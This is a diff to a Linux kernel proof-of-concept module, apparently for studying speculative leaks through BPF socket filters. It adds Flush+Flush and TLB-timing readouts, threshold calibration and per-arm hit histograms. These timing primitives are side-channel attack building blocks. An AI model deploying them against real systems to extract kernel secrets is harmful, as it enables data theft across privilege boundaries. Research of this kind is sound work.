@@ -126,9 +126,12 @@ static bool cbpf_poc_ssbd_filter;
 #define CBUF_COLD_PAGE_OFF  (CBUF_COLD_PAGE * 4096u + CPOC_HDR)
 #define CBUF_SIG_LINE_OFF   (CBUF_ARCH_PAGE * 4096u + CPOC_HDR + 64u)
 #define CBUF_COLD_LINE_OFF  (CBUF_ARCH_PAGE * 4096u + CPOC_HDR + 128u)
+#define CBUF_TLB_MON_DELTA  2048u
 
 static u8 cbpf_poc_buf[CBPF_POC_BUF_SIZE] __aligned(4096);
 static bool cbpf_poc_pp_line_mode;
+static bool cbpf_poc_ff_mode;
+static bool cbpf_poc_tlb_mode;
 
 /* Fixed warm-biased timing threshold, calibrated once off cbpf_poc_buf. */
 static u64  cpoc_thr;
@@ -175,6 +178,8 @@ static noinline void cbpf_poc_calibrate(void)
 #define CPOC_EV_STRIDE 65536UL
 #define CPOC_EV_MAX_WAYS 22		/* max around tested L2 associativity */
 #define CPOC_PP_HIST_MAX CPOC_EV_MAX_WAYS
+#define CPOC_FF_HIST_BUCKETS 64
+#define CPOC_FF_HIST_WIDTH   8u
 
 static const volatile u8 *cbpf_poc_arch_line(void)
 {
@@ -193,12 +198,38 @@ static const volatile u8 *cbpf_poc_cold_line(void)
 			     CBUF_COLD_LINE_OFF : CBUF_COLD_PAGE_OFF];
 }
 
+static const volatile u8 *cbpf_poc_arch_tlb_line(void)
+{
+	return &cbpf_poc_buf[CBUF_ARCH_PAGE * 4096u + CPOC_HDR +
+			     CBUF_TLB_MON_DELTA];
+}
+
+static const volatile u8 *cbpf_poc_sig_tlb_line(void)
+{
+	return &cbpf_poc_buf[CBUF_SIG_PAGE * 4096u + CPOC_HDR +
+			     CBUF_TLB_MON_DELTA];
+}
+
+static const volatile u8 *cbpf_poc_cold_tlb_line(void)
+{
+	return &cbpf_poc_buf[CBUF_COLD_PAGE * 4096u + CPOC_HDR +
+			     CBUF_TLB_MON_DELTA];
+}
+
 static u8 *cpoc_ev_base;
 static const volatile u8 *cpoc_ev[CPOC_EV_MAX_WAYS];
 static int cpoc_ev_max_n;
 static int cpoc_ev_n = CPOC_EV_MAX_WAYS;
 static u64 cpoc_ev_thr;			/* per-line L2-hit vs L3-hit cutoff */
 static bool cbpf_poc_pp_poscontrol;	/* kernel fills SIG every call (pos. ctrl) */
+static u64 cpoc_ff_thr;
+static u64 cpoc_ff_cached_ref, cpoc_ff_uncached_ref;
+static bool cpoc_ff_cached_gt;
+static bool cpoc_ff_calibrated;
+static u64 cpoc_tlb_thr;
+static u64 cpoc_tlb_hit_ref, cpoc_tlb_miss_ref;
+static bool cpoc_tlb_hit_gt;
+static bool cpoc_tlb_calibrated;
 
 enum cbpf_poc_pp_arm {
 	CPOC_PP_OFF_GADGET = 0,
@@ -218,6 +249,14 @@ struct pp_bucket {
 };
 static struct pp_bucket pp_arms[CPOC_PP_NR_ARMS];
 
+struct ff_bucket {
+	u64 n, sig_hit, arch_hit, cold_hit;
+	u64 sig_sum, arch_sum, cold_sum;
+	u64 sig_hist[CPOC_FF_HIST_BUCKETS];
+};
+static struct ff_bucket ff_arms[CPOC_PP_NR_ARMS];
+static struct ff_bucket tlb_arms[CPOC_PP_NR_ARMS];
+
 static void pp_record(struct pp_bucket *b, int pp)
 {
 	int h = pp;
@@ -235,6 +274,142 @@ static void pp_record(struct pp_bucket *b, int pp)
 		b->ge2++;
 	if (pp >= 3)
 		b->ge3++;
+}
+
+static bool ff_is_cached(u64 d)
+{
+	if (!cpoc_ff_calibrated)
+		return false;
+	return cpoc_ff_cached_gt ? d >= cpoc_ff_thr : d <= cpoc_ff_thr;
+}
+
+static void ff_record(struct ff_bucket *b, u64 sig, u64 arch, u64 cold)
+{
+	u64 h = sig / CPOC_FF_HIST_WIDTH;
+
+	if (h >= CPOC_FF_HIST_BUCKETS)
+		h = CPOC_FF_HIST_BUCKETS - 1;
+	b->n++;
+	b->sig_sum += sig;
+	b->arch_sum += arch;
+	b->cold_sum += cold;
+	b->sig_hist[h]++;
+	if (ff_is_cached(sig))
+		b->sig_hit++;
+	if (ff_is_cached(arch))
+		b->arch_hit++;
+	if (ff_is_cached(cold))
+		b->cold_hit++;
+}
+
+static bool tlb_is_hit(u64 d)
+{
+	if (!cpoc_tlb_calibrated)
+		return false;
+	return cpoc_tlb_hit_gt ? d >= cpoc_tlb_thr : d <= cpoc_tlb_thr;
+}
+
+static void tlb_record(struct ff_bucket *b, u64 sig, u64 arch, u64 cold)
+{
+	u64 h = sig / CPOC_FF_HIST_WIDTH;
+
+	if (h >= CPOC_FF_HIST_BUCKETS)
+		h = CPOC_FF_HIST_BUCKETS - 1;
+	b->n++;
+	b->sig_sum += sig;
+	b->arch_sum += arch;
+	b->cold_sum += cold;
+	b->sig_hist[h]++;
+	if (tlb_is_hit(sig))
+		b->sig_hit++;
+	if (tlb_is_hit(arch))
+		b->arch_hit++;
+	if (tlb_is_hit(cold))
+		b->cold_hit++;
+}
+
+static u64 cbpf_poc_time_load(const volatile u8 *p)
+{
+	u64 t0, d;
+	u8 s;
+
+	t0 = rdtsc_ordered();
+	s = *p;
+	d = rdtsc_ordered() - t0;
+	asm volatile("" :: "r"(s) : "memory");
+	return d;
+}
+
+static void cbpf_poc_invlpg(const volatile u8 *p)
+{
+	asm volatile("invlpg (%0)" :: "r"(p) : "memory");
+}
+
+static u64 cbpf_poc_time_clflush(const volatile u8 *p)
+{
+	u64 t0, d;
+
+	t0 = rdtsc_ordered();
+	asm volatile("clflush %0" :: "m"(*p) : "memory");
+	mb();
+	d = rdtsc_ordered() - t0;
+	return d;
+}
+
+static noinline void cbpf_poc_ff_calibrate(void)
+{
+	const volatile u8 *p = &cbpf_poc_buf[CPOC_HDR + 192u];
+	unsigned long flags;
+	u64 cached = 0, uncached = 0;
+	u8 s = 0;
+	int i;
+
+	local_irq_save(flags);
+	for (i = 0; i < 128; i++) {
+		s += *p;
+		mb();
+		cached += cbpf_poc_time_clflush(p);
+		uncached += cbpf_poc_time_clflush(p);
+	}
+	local_irq_restore(flags);
+	cpoc_ff_cached_ref = cached / 128;
+	cpoc_ff_uncached_ref = uncached / 128;
+	cpoc_ff_cached_gt = cpoc_ff_cached_ref >= cpoc_ff_uncached_ref;
+	cpoc_ff_thr = (cpoc_ff_cached_ref + cpoc_ff_uncached_ref) / 2;
+	cpoc_ff_calibrated = true;
+	pr_info("cbpf_poc: ff_thr=%llu cached=%llu uncached=%llu cached_gt=%d\n",
+		cpoc_ff_thr, cpoc_ff_cached_ref, cpoc_ff_uncached_ref,
+		cpoc_ff_cached_gt);
+	(void)s;
+}
+
+static noinline void cbpf_poc_tlb_calibrate(void)
+{
+	const volatile u8 *p = &cbpf_poc_buf[CPOC_HDR + CBUF_TLB_MON_DELTA];
+	unsigned long flags;
+	u64 hit = 0, miss = 0;
+	u8 s = 0;
+	int i;
+
+	local_irq_save(flags);
+	for (i = 0; i < 128; i++) {
+		s += *p;
+		mb();
+		hit += cbpf_poc_time_load(p);
+		cbpf_poc_invlpg(p);
+		mb();
+		miss += cbpf_poc_time_load(p);
+	}
+	local_irq_restore(flags);
+	cpoc_tlb_hit_ref = hit / 128;
+	cpoc_tlb_miss_ref = miss / 128;
+	cpoc_tlb_hit_gt = cpoc_tlb_hit_ref >= cpoc_tlb_miss_ref;
+	cpoc_tlb_thr = (cpoc_tlb_hit_ref + cpoc_tlb_miss_ref) / 2;
+	cpoc_tlb_calibrated = true;
+	pr_info("cbpf_poc: tlb_thr=%llu hit=%llu miss=%llu hit_gt=%d\n",
+		cpoc_tlb_thr, cpoc_tlb_hit_ref, cpoc_tlb_miss_ref,
+		cpoc_tlb_hit_gt);
+	(void)s;
 }
 
 static void cbpf_poc_ev_select(void)
@@ -343,6 +518,8 @@ static void cbpf_poc_reset_counts(void)
 	cbuf_arch_sum = 0;
 	cbuf_cold_sum = 0;
 	memset(pp_arms, 0, sizeof(pp_arms));
+	memset(ff_arms, 0, sizeof(ff_arms));
+	memset(tlb_arms, 0, sizeof(tlb_arms));
 }
 
 static void cbpf_poc_flush_buf(void)
@@ -351,11 +528,27 @@ static void cbpf_poc_flush_buf(void)
 	const volatile u8 *ps = cbpf_poc_sig_line();
 	const volatile u8 *pc = cbpf_poc_cold_line();
 
+	if (cbpf_poc_tlb_mode) {
+		const volatile u8 *ta = cbpf_poc_arch_tlb_line();
+		const volatile u8 *ts = cbpf_poc_sig_tlb_line();
+		const volatile u8 *tc = cbpf_poc_cold_tlb_line();
+		u8 s = *ta + *ts + *tc;
+
+		mb();
+		cbpf_poc_invlpg(ta);
+		cbpf_poc_invlpg(ts);
+		cbpf_poc_invlpg(tc);
+		mb();
+		asm volatile("" :: "r"(s) : "memory");
+		return;
+	}
+
 	asm volatile("clflush %0" :: "m"(*pa) : "memory");
 	asm volatile("clflush %0" :: "m"(*ps) : "memory");
 	asm volatile("clflush %0" :: "m"(*pc) : "memory");
 	mb();
-	cbpf_poc_prime_ev();	/* prime the L2 eviction set (evicts SIG from L2) */
+	if (!cbpf_poc_ff_mode)
+		cbpf_poc_prime_ev();	/* prime the L2 eviction set (evicts SIG from L2) */
 }
 
 static noinline void cbpf_poc_probe_buf(void)
@@ -379,6 +572,37 @@ static noinline void cbpf_poc_probe_buf(void)
 	if (cbpf_poc_pp_poscontrol) {
 		u8 s = *ps;
 		asm volatile("" :: "r"(s) : "memory");
+	}
+	if (cbpf_poc_tlb_mode) {
+		const volatile u8 *ta = cbpf_poc_arch_tlb_line();
+		const volatile u8 *ts = cbpf_poc_sig_tlb_line();
+		const volatile u8 *tc = cbpf_poc_cold_tlb_line();
+		unsigned int arm = cbpf_poc_pp_poscontrol ?
+				   CPOC_PP_POSCONTROL : cbpf_poc_pp_arm;
+
+		ls = cbpf_poc_time_load(ts);
+		la = cbpf_poc_time_load(ta);
+		lc = cbpf_poc_time_load(tc);
+		local_irq_restore(flags);
+		if (arm >= CPOC_PP_NR_ARMS)
+			arm = CPOC_PP_OFF_GADGET;
+		cbuf_n++;
+		tlb_record(&tlb_arms[arm], ls, la, lc);
+		return;
+	}
+	if (cbpf_poc_ff_mode) {
+		unsigned int arm = cbpf_poc_pp_poscontrol ?
+				   CPOC_PP_POSCONTROL : cbpf_poc_pp_arm;
+
+		ls = cbpf_poc_time_clflush(ps);
+		la = cbpf_poc_time_clflush(pa);
+		lc = cbpf_poc_time_clflush(pc);
+		local_irq_restore(flags);
+		if (arm >= CPOC_PP_NR_ARMS)
+			arm = CPOC_PP_OFF_GADGET;
+		cbuf_n++;
+		ff_record(&ff_arms[arm], ls, la, lc);
+		return;
 	}
 	/* P+P probe FIRST, before we touch SIG for the timing probe: count the
 	 * eviction-set lines demoted out of L2. A transient SIG fill during the
@@ -429,6 +653,27 @@ static void pp_show_bucket(struct seq_file *m, const char *name,
 	seq_putc(m, '\n');
 }
 
+static void readout_show_bucket(struct seq_file *m, const char *prefix,
+				const char *name, const struct ff_bucket *b)
+{
+	u64 n = b->n ? b->n : 1;
+	int i;
+
+	seq_printf(m,
+		   "%s %-6s n=%llu sig_hit=%llu(%llu.%02llu%%) arch_hit=%llu cold_hit=%llu sig_avg=%llu arch_avg=%llu cold_avg=%llu hist=",
+		   prefix, name, b->n, b->sig_hit,
+		   b->n ? b->sig_hit * 100 / b->n : 0,
+		   b->n ? (b->sig_hit * 10000 / b->n) % 100 : 0,
+		   b->arch_hit, b->cold_hit,
+		   b->sig_sum / n, b->arch_sum / n, b->cold_sum / n);
+	for (i = 0; i < CPOC_FF_HIST_BUCKETS; i++) {
+		if (b->sig_hist[i])
+			seq_printf(m, " %u:%llu", i * CPOC_FF_HIST_WIDTH,
+				   b->sig_hist[i]);
+	}
+	seq_putc(m, '\n');
+}
+
 static int cbpf_poc_show(struct seq_file *m, void *v)
 {
 	u64 bn = cbuf_n ? cbuf_n : 1;
@@ -450,11 +695,29 @@ static int cbpf_poc_show(struct seq_file *m, void *v)
 		   cbpf_poc_pp_line_mode ? "line" : "page",
 		   cbpf_poc_pp_arm, cpoc_ev_n, cpoc_ev_max_n, cpoc_ev_thr,
 		   cbpf_poc_pp_poscontrol);
+	seq_printf(m, "ff mode=%d thr=%llu cached_ref=%llu uncached_ref=%llu cached_gt=%d calibrated=%d\n",
+		   cbpf_poc_ff_mode, cpoc_ff_thr, cpoc_ff_cached_ref,
+		   cpoc_ff_uncached_ref, cpoc_ff_cached_gt,
+		   cpoc_ff_calibrated);
+	seq_printf(m, "tlb mode=%d thr=%llu hit_ref=%llu miss_ref=%llu hit_gt=%d calibrated=%d\n",
+		   cbpf_poc_tlb_mode, cpoc_tlb_thr, cpoc_tlb_hit_ref,
+		   cpoc_tlb_miss_ref, cpoc_tlb_hit_gt,
+		   cpoc_tlb_calibrated);
 	pp_show_bucket(m, "OFF_G", &pp_arms[CPOC_PP_OFF_GADGET]);
 	pp_show_bucket(m, "OFF_N", &pp_arms[CPOC_PP_OFF_NULL]);
 	pp_show_bucket(m, "ON_G", &pp_arms[CPOC_PP_ON_GADGET]);
 	pp_show_bucket(m, "ON_N", &pp_arms[CPOC_PP_ON_NULL]);
 	pp_show_bucket(m, "POSC", &pp_arms[CPOC_PP_POSCONTROL]);
+	readout_show_bucket(m, "ff", "OFF_G", &ff_arms[CPOC_PP_OFF_GADGET]);
+	readout_show_bucket(m, "ff", "OFF_N", &ff_arms[CPOC_PP_OFF_NULL]);
+	readout_show_bucket(m, "ff", "ON_G", &ff_arms[CPOC_PP_ON_GADGET]);
+	readout_show_bucket(m, "ff", "ON_N", &ff_arms[CPOC_PP_ON_NULL]);
+	readout_show_bucket(m, "ff", "POSC", &ff_arms[CPOC_PP_POSCONTROL]);
+	readout_show_bucket(m, "tlb", "OFF_G", &tlb_arms[CPOC_PP_OFF_GADGET]);
+	readout_show_bucket(m, "tlb", "OFF_N", &tlb_arms[CPOC_PP_OFF_NULL]);
+	readout_show_bucket(m, "tlb", "ON_G", &tlb_arms[CPOC_PP_ON_GADGET]);
+	readout_show_bucket(m, "tlb", "ON_N", &tlb_arms[CPOC_PP_ON_NULL]);
+	readout_show_bucket(m, "tlb", "POSC", &tlb_arms[CPOC_PP_POSCONTROL]);
 	return 0;
 }
 
@@ -467,6 +730,8 @@ static int cbpf_poc_open(struct inode *ino, struct file *f)
  *   'c'       -- (re)calibrate the fixed timing threshold
  *   's' / 'r' -- enable / disable SSBD around the socket-filter call
  *   'L' / 'l' -- use same-page line selector / page-8 selector
+ *   'F' / 'f' -- use / disable Flush+Flush target-line readout
+ *   'T' / 't' -- use / disable cache-hot TLB target-page readout
  *   'eN'      -- use N active lines from the congruent L2 eviction set
  *   'aN'      -- tag the current P+P arm, N in 0..3
  *   'z'       -- reset exported counters
@@ -497,6 +762,20 @@ static ssize_t cbpf_poc_write(struct file *f, const char __user *u,
 		cbpf_poc_pp_poscontrol = true;	/* P+P positive control on */
 	} else if (c == 'p') {
 		cbpf_poc_pp_poscontrol = false;
+	} else if (c == 'F') {
+		cbpf_poc_ff_mode = true;
+		cbpf_poc_tlb_mode = false;
+		cbpf_poc_ff_calibrate();
+	} else if (c == 'f') {
+		cbpf_poc_ff_mode = false;
+		cbpf_poc_ff_calibrate();
+	} else if (c == 'T') {
+		cbpf_poc_tlb_mode = true;
+		cbpf_poc_ff_mode = false;
+		cbpf_poc_tlb_calibrate();
+	} else if (c == 't') {
+		cbpf_poc_tlb_mode = false;
+		cbpf_poc_tlb_calibrate();
 	} else if (c == 'L') {
 		cbpf_poc_pp_line_mode = true;
 		cbpf_poc_ev_select();
@@ -549,6 +828,8 @@ static int __init cbpf_poc_init(void)
 	cbpf_poc_ev_init();	/* build the L2 eviction set congruent to SIG */
 	cbpf_poc_calibrate();	/* establish a usable timing threshold at boot */
 	cbpf_poc_ev_calibrate();/* establish the L2/L3 eviction-count cutoff */
+	cbpf_poc_ff_calibrate();/* establish the clflush cached/uncached cutoff */
+	cbpf_poc_tlb_calibrate();/* establish the cache-hot TLB-hit cutoff */
 	return 0;
 }
 late_initcall(cbpf_poc_init);
